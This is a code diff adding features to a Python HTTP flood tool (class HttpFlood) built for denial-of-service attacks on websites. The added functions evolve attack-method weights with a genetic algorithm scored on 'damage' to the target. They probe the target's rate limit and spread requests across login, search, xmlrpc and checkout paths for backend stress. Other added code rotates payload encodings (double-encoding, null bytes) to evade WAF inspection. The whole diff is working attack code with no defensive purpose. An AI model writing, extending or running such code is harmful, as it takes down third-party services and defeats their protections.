@@ -2610,6 +2610,15 @@ class HttpFlood(Thread):
         "successful_streak": 0,    # Consecutive successful requests
         "method_timing": {},       # method -> avg execution time in ms
         "damage_score": 0,         # Estimated total damage dealt to target
+        "generation": 0,           # Genetic algorithm generation counter
+        "gene_pool": [],           # Top-performing weight sets (DNA)
+        "current_dna": None,       # Active weight set being tested
+        "dna_score": 0,            # Fitness score for current DNA
+        "rate_limit_threshold": None, # Discovered requests/sec limit
+        "rate_limit_probed": False,
+        "multi_path_queue": [],    # Queue of (path, method) pairs for multi-targeting
+        "encoding_rotation": 0,    # Payload encoding variant counter
+        "path_scores": {},         # path -> success_rate for path targeting
     }
     
     # ========================================================================
@@ -2733,6 +2742,9 @@ class HttpFlood(Thread):
                 "best_method": intel.get("best_method"),
                 "target_weakpoint": intel.get("target_weakpoint"),
                 "response_time_ms": intel.get("response_time_ms", 0),
+                "gene_pool": intel.get("gene_pool", [])[:3],
+                "rate_limit_threshold": intel.get("rate_limit_threshold"),
+                "path_scores": dict(list(intel.get("path_scores", {}).items())[:20]),
             }
             with open(memory_file, 'w') as f:
                 json.dump(save_data, f, indent=2)
@@ -2876,6 +2888,201 @@ class HttpFlood(Thread):
         """Select a random complete browser profile for header consistency."""
         return dict(randchoice(self._BROWSER_PROFILES))
     
+    def _chaos_evolve_weights(self):
+        """Genetic Algorithm: Evolve optimal weight configurations across generations.
+        Top-performing weight sets breed and mutate to create superior strategies."""
+        intel = self._chaos_intel
+        
+        # Only evolve every 100 executions
+        if intel["total_executions"] % 100 != 0 or intel["total_executions"] < 100:
+            return
+            
+        intel["generation"] += 1
+        
+        # Score current DNA based on combined metrics
+        eff_scores = intel.get("efficiency_score", {})
+        if not eff_scores:
+            return
+            
+        avg_efficiency = sum(eff_scores.values()) / max(len(eff_scores), 1)
+        burn_penalty = len(BURNED_PROXIES) * 2
+        damage_bonus = intel.get("damage_score", 0) / 10
+        streak_bonus = intel.get("successful_streak", 0)
+        
+        fitness = int((avg_efficiency * 100) + damage_bonus + streak_bonus - burn_penalty)
+        
+        # Store current weights as DNA
+        current_plan = self._chaos_plan()
+        dna_entry = {"weights": dict(current_plan), "fitness": fitness, "gen": intel["generation"]}
+        
+        # Add to gene pool
+        intel["gene_pool"].append(dna_entry)
+        
+        # Keep only top 5 performing DNA
+        intel["gene_pool"] = sorted(intel["gene_pool"], key=lambda x: -x["fitness"])[:5]
+        
+        if len(intel["gene_pool"]) >= 2:
+            # Crossover: Breed top 2 DNAs
+            parent_a = intel["gene_pool"][0]["weights"]
+            parent_b = intel["gene_pool"][1]["weights"]
+            
+            child = {}
+            for method in set(list(parent_a.keys()) + list(parent_b.keys())):
+                # 50% chance from each parent
+                if randint(0, 1) == 0:
+                    child[method] = parent_a.get(method, 0)
+                else:
+                    child[method] = parent_b.get(method, 0)
+                    
+                # 15% mutation chance
+                if randint(1, 100) <= 15:
+                    mutation = randint(-20, 30)
+                    child[method] = max(child[method] + mutation, 0)
+            
+            intel["current_dna"] = child
+            
+            if int(REQUESTS_SENT) > 0 and intel["generation"] % 3 == 0:
+                print(f"{bcolors.OKCYAN}[CHAOS DNA] Generation {intel['generation']} | Best Fitness: {intel['gene_pool'][0]['fitness']} | Pool Size: {len(intel['gene_pool'])}{bcolors.RESET}")
+    
+    def _chaos_probe_rate_limit(self):
+        """Carefully probe the exact rate limit threshold of the target.
+        Sends controlled bursts to find the maximum safe RPS."""
+        intel = self._chaos_intel
+        
+        if intel.get("rate_limit_probed"):
+            return
+        
+        # Only probe once, early in the attack
+        if intel["total_executions"] != 50:
+            return
+            
+        intel["rate_limit_probed"] = True
+        
+        try:
+            import urllib.request
+            target_url = f"{self._target.scheme}://{self._target.authority}/"
+            
+            # Send increasing burst sizes and check when we get blocked
+            threshold = 0
+            for burst_size in [5, 10, 15, 20, 30]:
+                blocked = False
+                for i in range(burst_size):
+                    try:
+                        req = urllib.request.Request(target_url, headers={
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                        })
+                        with urllib.request.urlopen(req, timeout=4) as resp:
+                            if resp.status in (403, 429):
+                                blocked = True
+                                break
+                    except Exception:
+                        blocked = True
+                        break
+                        
+                if blocked:
+                    threshold = burst_size - 1
+                    break
+                else:
+                    threshold = burst_size
+                    
+            intel["rate_limit_threshold"] = max(threshold, 3)
+            
+            if int(REQUESTS_SENT) < 100:
+                if threshold < 10:
+                    limit_str = f"{bcolors.FAIL}STRICT ({threshold} req/burst){bcolors.RESET}"
+                elif threshold < 20:
+                    limit_str = f"{bcolors.WARNING}MODERATE ({threshold} req/burst){bcolors.RESET}"
+                else:
+                    limit_str = f"{bcolors.OKGREEN}LENIENT ({threshold}+ req/burst){bcolors.RESET}"
+                print(f"[CHAOS PROBE] Rate limit threshold: {limit_str}")
+                
+        except Exception:
+            intel["rate_limit_threshold"] = 5  # Assume strict
+    
+    def _chaos_multi_path_targeting(self):
+        """Generate a queue of (path, method_hint) pairs for simultaneous multi-path attacks.
+        Instead of hitting one endpoint, distribute across multiple for maximum backend stress."""
+        intel = self._chaos_intel
+        
+        if intel.get("multi_path_queue"):
+            return  # Queue still active
+            
+        # Gather all known paths
+        all_paths = []
+        uncached = intel.get("uncached_paths", [])
+        discovered = intel.get("endpoints_discovered", [])
+        
+        if hasattr(self, 'crawled_paths') and self.crawled_paths:
+            all_paths.extend(self.crawled_paths[:10])
+        all_paths.extend(uncached)
+        all_paths.extend(discovered)
+        
+        if not all_paths:
+            return
+            
+        # Remove duplicates
+        all_paths = list(set(all_paths))
+        
+        # Build multi-path queue with method hints
+        queue = []
+        for path in all_paths[:8]:  # Max 8 paths per cycle
+            path_lower = path.lower()
+            
+            # Match paths with optimal methods
+            if 'xmlrpc' in path_lower:
+                queue.append((path, "XMLRPC_AMP"))
+            elif 'search' in path_lower or '?s=' in path_lower or '?q=' in path_lower:
+                queue.append((path, "WP_SEARCH"))
+            elif 'api' in path_lower or 'graphql' in path_lower or 'rest' in path_lower:
+                queue.append((path, "POST_DYN"))
+            elif 'login' in path_lower or 'admin' in path_lower:
+                queue.append((path, "POST_DYN"))
+            elif 'cart' in path_lower or 'checkout' in path_lower:
+                queue.append((path, "POST_DYN"))
+            else:
+                queue.append((path, "DYN"))
+        
+        # Shuffle to avoid predictable ordering
+        from random import shuffle
+        shuffle(queue)
+        intel["multi_path_queue"] = queue
+    
+    def _chaos_encode_payload(self, payload_str):
+        """Rotate payload encoding to evade Deep Packet Inspection (DPI).
+        WAFs often only inspect one encoding format."""
+        intel = self._chaos_intel
+        intel["encoding_rotation"] += 1
+        variant = intel["encoding_rotation"] % 6
+        
+        if variant == 0:
+            return payload_str  # Raw
+        elif variant == 1:
+            # URL-encode special characters
+            from urllib.parse import quote
+            return quote(payload_str, safe='{}":,')
+        elif variant == 2:
+            # Double-encode (bypasses single-decode WAF rules)
+            from urllib.parse import quote
+            return quote(quote(payload_str, safe=''), safe='')
+        elif variant == 3:
+            # Add null bytes (some WAFs truncate at null)
+            return payload_str.replace('"', '%00"')
+        elif variant == 4:
+            # Unicode escape sequences
+            return payload_str.replace('a', '\u0061').replace('e', '\u0065')
+        else:
+            # Chunked-style padding
+            return '  ' + payload_str + '  '
+    
+    def _chaos_score_path(self, path, success):
+        """Track success rate per path for intelligent path selection."""
+        intel = self._chaos_intel
+        if path not in intel["path_scores"]:
+            intel["path_scores"][path] = {"success": 0, "total": 0}
+        intel["path_scores"][path]["total"] += 1
+        if success:
+            intel["path_scores"][path]["success"] += 1
+
     def _chaos_analyze_block_page(self, response_body):
         """Analyze WAF block pages to identify exact rules being triggered.
         This lets us understand WHY we're being blocked and adapt specifically."""
@@ -3767,6 +3974,30 @@ class HttpFlood(Thread):
             if phase == "ASSAULT":
                 intel["exploration_bonus"] = False
         
+        # === STRATEGY V: Genetic DNA Override ===
+        # If we have evolved DNA from the genetic algorithm, blend it in
+        dna = intel.get("current_dna")
+        if dna and phase not in ("PROBE",):
+            blend_factor = min(intel.get("generation", 0) / 10, 0.6)  # Max 60% DNA influence
+            for method_name, dna_weight in dna.items():
+                if method_name in weights:
+                    # Blend: (1-factor)*planned + factor*evolved
+                    weights[method_name] = int(weights[method_name] * (1 - blend_factor) + dna_weight * blend_factor)
+        
+        # === STRATEGY W: Rate Limit Awareness ===
+        threshold = intel.get("rate_limit_threshold")
+        if threshold is not None:
+            if threshold < 8:
+                # Very strict rate limit. Go maximum stealth
+                weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 85)
+                weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
+                weights["STRESS"] = 0
+                weights["PPS"] = 0
+            elif threshold < 15:
+                # Moderate rate limit. Balance stealth and power
+                weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
+                weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 25)
+        
         # === FILTER: Remove unavailable methods ===
         if not HAS_TLS_CLIENT:
             weights["STEALTH_JA3"] = 0
@@ -3830,6 +4061,16 @@ class HttpFlood(Thread):
         # Phase 1.6: AUTO-TUNE attack rate
         if intel["total_executions"] % 10 == 0:
             self._chaos_adaptive_rate()
+        
+        # Phase 1.7: GENETIC EVOLUTION (every 100 executions)
+        self._chaos_evolve_weights()
+        
+        # Phase 1.8: RATE LIMIT PROBING (exec 50 only)
+        self._chaos_probe_rate_limit()
+        
+        # Phase 1.9: MULTI-PATH QUEUE REFRESH (every 50 executions)
+        if intel["total_executions"] % 50 == 0:
+            self._chaos_multi_path_targeting()
             
         # Apply timing jitter (human-like random delay)
         jitter = intel.get("jitter_ms", 0)
@@ -3879,7 +4120,18 @@ class HttpFlood(Thread):
             else:
                 intel["combo_queue"] = []  # Abort invalid combo
                 
-        # Priority 1.5: Try dynamic combo (generated from best performers)
+        # Priority 1.5: Multi-path targeting (use queued path+method pair)
+        if chosen_name == "GET" and intel.get("multi_path_queue"):
+            mp_path, mp_method = intel["multi_path_queue"].pop(0)
+            if mp_method in method_map and weights.get(mp_method, 0) > 0:
+                chosen_name = mp_method
+                # Override the target path temporarily for this method
+                if hasattr(self, 'crawled_paths') and mp_path not in (self.crawled_paths or []):
+                    if not hasattr(self, 'crawled_paths') or not self.crawled_paths:
+                        self.crawled_paths = []
+                    self.crawled_paths.insert(0, mp_path)
+        
+        # Priority 1.6: Try dynamic combo (generated from best performers)
         if chosen_name == "GET" and not intel.get("combo_queue") and intel["total_executions"] % randint(20, 30) == 0:
             dynamic_combo = self._chaos_build_dynamic_combo()
             if dynamic_combo:
